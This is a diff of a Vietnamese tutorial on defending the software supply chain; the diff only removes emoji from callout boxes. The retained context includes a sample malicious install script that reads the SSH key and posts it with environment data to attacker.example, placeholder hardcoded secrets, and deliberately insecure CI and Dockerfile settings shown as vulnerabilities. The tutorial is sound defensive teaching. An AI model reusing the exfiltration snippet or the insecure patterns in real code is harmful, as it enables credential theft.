@@ -4,7 +4,7 @@ Bạn không còn chỉ viết code của riêng mình nữa. Một service Node
 
 Bài này tiếp cận theo tư duy phòng thủ của kỹ sư xây hệ thống: hiểu attack cụ thể, rồi dựng hàng rào tự động trong pipeline để con người không phải nhớ.
 
-> 💡 **Nguyên tắc**: Trust is a vulnerability. Mọi dependency, base image, và CI token đều là attack surface. Mục tiêu không phải "tin ít hơn" mà là "verify được mọi thứ bạn tin".
+> **Nguyên tắc**: Trust is a vulnerability. Mọi dependency, base image, và CI token đều là attack surface. Mục tiêu không phải "tin ít hơn" mà là "verify được mọi thứ bạn tin".
 
 ---
 
@@ -42,7 +42,7 @@ const ssh = fs.readFileSync(`${process.env.HOME}/.ssh/id_rsa`, 'utf8');
 https.request('https://attacker.example/x', { method: 'POST' }).end(env + ssh);
 ```
 
-> ⚠️ **Lỗ hổng**: `postinstall`/`preinstall` script chạy code tùy ý **trước khi** bạn kịp review một dòng nào. Trên dev laptop nó đọc được SSH key, AWS creds, `.npmrc` token. Trong CI nó đọc được toàn bộ secret của runner.
+> **Lỗ hổng**: `postinstall`/`preinstall` script chạy code tùy ý **trước khi** bạn kịp review một dòng nào. Trên dev laptop nó đọc được SSH key, AWS creds, `.npmrc` token. Trong CI nó đọc được toàn bộ secret của runner.
 
 **Phòng — tắt script tùy tiện, dùng allowlist:**
 
@@ -161,7 +161,7 @@ jobs:
             --fail-on-vuln
 ```
 
-> 💡 **Nguyên tắc**: SCA chỉ thấy lỗ hổng **đã biết**. Nó không phát hiện malware ngày 0 hay typosquat tên mới. Hãy coi nó là một lớp, không phải toàn bộ phòng thủ. Kết hợp với SBOM + pin + allowlist registry.
+> **Nguyên tắc**: SCA chỉ thấy lỗ hổng **đã biết**. Nó không phát hiện malware ngày 0 hay typosquat tên mới. Hãy coi nó là một lớp, không phải toàn bộ phòng thủ. Kết hợp với SBOM + pin + allowlist registry.
 
 Quản trị tiếng ồn: dùng file ignore có **thời hạn và lý do**, đừng tắt vĩnh viễn.
 
@@ -190,7 +190,7 @@ syft myapp:1.4.2 -o spdx-json=sbom.spdx.json
 grype sbom:./sbom.json
 ```
 
-> 💡 **Nguyên tắc**: Sinh SBOM tại thời điểm build, **đính kèm vào release/artifact**, và lưu trữ. SBOM sinh ra rồi vứt đi thì vô dụng — giá trị nằm ở chỗ truy được ngược lại artifact đã ship.
+> **Nguyên tắc**: Sinh SBOM tại thời điểm build, **đính kèm vào release/artifact**, và lưu trữ. SBOM sinh ra rồi vứt đi thì vô dụng — giá trị nằm ở chỗ truy được ngược lại artifact đã ship.
 
 ---
 
@@ -206,7 +206,7 @@ Nếu hôm nay build ra một thứ, ngày mai build ra thứ khác, thì SCA v�
 | pip | `requests` | `requests==2.31.0 --hash=sha256:...` |
 
 ```dockerfile
-# ⚠️ Lỗ hổng: tag "mềm" — :20 có thể trỏ image khác sau mỗi push
+# Lỗ hổng: tag "mềm" — :20 có thể trỏ image khác sau mỗi push
 FROM node:20
 
 # Phòng: pin theo digest immutable — luôn ra đúng một image
@@ -220,7 +220,7 @@ pnpm install --frozen-lockfile
 poetry install --no-update
 ```
 
-> ⚠️ **Lỗ hổng**: `actions/checkout@v4` là một **tag di động**. Nếu account của maintainer action bị chiếm, tag `v4` có thể bị trỏ lại sang commit độc — và bạn chạy nó với quyền CI. Pin theo **commit SHA** đầy đủ là cách duy nhất bất biến.
+> **Lỗ hổng**: `actions/checkout@v4` là một **tag di động**. Nếu account của maintainer action bị chiếm, tag `v4` có thể bị trỏ lại sang commit độc — và bạn chạy nó với quyền CI. Pin theo **commit SHA** đầy đủ là cách duy nhất bất biến.
 
 ---
 
@@ -229,7 +229,7 @@ poetry install --no-update
 ### Đừng bao giờ commit secret
 
 ```js
-// ⚠️ Lỗ hổng: secret nằm trong source → vào git history vĩnh viễn,
+// Lỗ hổng: secret nằm trong source → vào git history vĩnh viễn,
 // vào mọi clone, mọi fork, mọi backup. Đổi key thôi KHÔNG đủ.
 const db = connect("postgres://admin:S3cr3t@prod-db:5432/app");
 const stripe = new Stripe("sk_live_51H8x...");
@@ -258,7 +258,7 @@ gitleaks detect --source . --redact
 trufflehog git file://. --only-verified   # chỉ báo secret đã verify còn sống
 ```
 
-> ⚠️ **Lỗ hổng**: Nếu secret đã lỡ commit, nó nằm trong git history **mãi mãi**. Việc duy nhất đúng là **rotate (vô hiệu hóa) ngay** secret đó, rồi mới dọn history. Xóa file ở commit sau không cứu được gì.
+> **Lỗ hổng**: Nếu secret đã lỡ commit, nó nằm trong git history **mãi mãi**. Việc duy nhất đúng là **rotate (vô hiệu hóa) ngay** secret đó, rồi mới dọn history. Xóa file ở commit sau không cứu được gì.
 
 ### Vault / Secrets Manager + rotation
 
@@ -273,7 +273,7 @@ creds = client.secrets.database.generate_credentials(name="app-postgres")
 db = connect(user=creds["username"], password=creds["password"])  # TTL ngắn
 ```
 
-> 💡 **Nguyên tắc**: Secret tốt nhất là secret **ngắn hạn (short-lived)**. Static credential sống nhiều tháng là tài sản cho attacker; dynamic credential hết hạn sau 1 giờ thì leak cũng gần như vô giá trị. Ưu tiên rotation tự động, đặt TTL ngắn, và prefer **workload identity** (OIDC) hơn long-lived key.
+> **Nguyên tắc**: Secret tốt nhất là secret **ngắn hạn (short-lived)**. Static credential sống nhiều tháng là tài sản cho attacker; dynamic credential hết hạn sau 1 giờ thì leak cũng gần như vô giá trị. Ưu tiên rotation tự động, đặt TTL ngắn, và prefer **workload identity** (OIDC) hơn long-lived key.
 
 **Rotation checklist:**
 - [ ] Mọi secret có owner và lịch rotation (tự động nếu có thể).
@@ -290,7 +290,7 @@ Runner CI của bạn có quyền vào registry, prod, secret store. Compromise 
 ### Least-privilege runner
 
 ```yaml
-# ⚠️ Lỗ hổng: token mặc định có write toàn repo; pull_request_target từ fork
+# Lỗ hổng: token mặc định có write toàn repo; pull_request_target từ fork
 #    chạy code của attacker VỚI secret của bạn
 on: pull_request_target          # nguy hiểm khi checkout code PR
 permissions: write-all           # quá rộng
@@ -339,7 +339,7 @@ cosign verify \
 | L2 | Build trên service được host + provenance được ký. |
 | L3 | Build isolated, non-falsifiable provenance, source/build có bảo vệ. |
 
-> 💡 **Nguyên tắc**: Mục tiêu của signing + provenance là một chuỗi verify được: _"image này đến từ commit X, build bởi pipeline Y, gồm các thành phần trong SBOM Z"_. Không có chuỗi đó, "artifact tin cậy" chỉ là niềm tin.
+> **Nguyên tắc**: Mục tiêu của signing + provenance là một chuỗi verify được: _"image này đến từ commit X, build bởi pipeline Y, gồm các thành phần trong SBOM Z"_. Không có chuỗi đó, "artifact tin cậy" chỉ là niềm tin.
 
 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 360" role="img" style="width:100%;max-width:720px;height:auto;display:block;margin:1.25rem auto" font-family="ui-sans-serif, system-ui, sans-serif">
   <title>Chuỗi ký &amp; provenance với cosign / SLSA</title>
@@ -396,7 +396,7 @@ cosign verify \
 ### Container image trust
 
 ```dockerfile
-# ⚠️ Lỗ hổng: base image "béo" → hàng trăm CVE OS, chạy bằng root
+# Lỗ hổng: base image "béo" → hàng trăm CVE OS, chạy bằng root
 FROM ubuntu:latest
 COPY . /app
 CMD ["node", "/app/server.js"]
@@ -453,7 +453,7 @@ Cách các nguyên tắc trên ánh xạ vào AWS:
 - **Chặn khai thác ở rìa** → **AWS WAF** trước ALB/CloudFront/API Gateway để chặn pattern tấn công đã biết (bổ trợ, không thay thế việc vá supply chain).
 - **Quản trị tập trung** → bật **Inspector + GuardDuty + Config** qua **AWS Organizations** để policy áp cho mọi account, không sót.
 
-> 💡 **Nguyên tắc cuối**: Supply chain security là một **pipeline**, không phải một công cụ. Mỗi lớp (dependency → SCA → SBOM → pin → secrets → CI → artifact → image) lọc bớt một loại rủi ro; tự động hóa toàn bộ trong CI để chúng chạy mỗi lần build, vì con người sẽ quên còn pipeline thì không.
+> **Nguyên tắc cuối**: Supply chain security là một **pipeline**, không phải một công cụ. Mỗi lớp (dependency → SCA → SBOM → pin → secrets → CI → artifact → image) lọc bớt một loại rủi ro; tự động hóa toàn bộ trong CI để chúng chạy mỗi lần build, vì con người sẽ quên còn pipeline thì không.
 
 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 502" role="img" style="width:100%;max-width:720px;height:auto;display:block;margin:1.25rem auto" font-family="ui-sans-serif, system-ui, sans-serif">
   <title>Pipeline phòng thủ supply chain — 8 lớp lọc rủi ro</title>
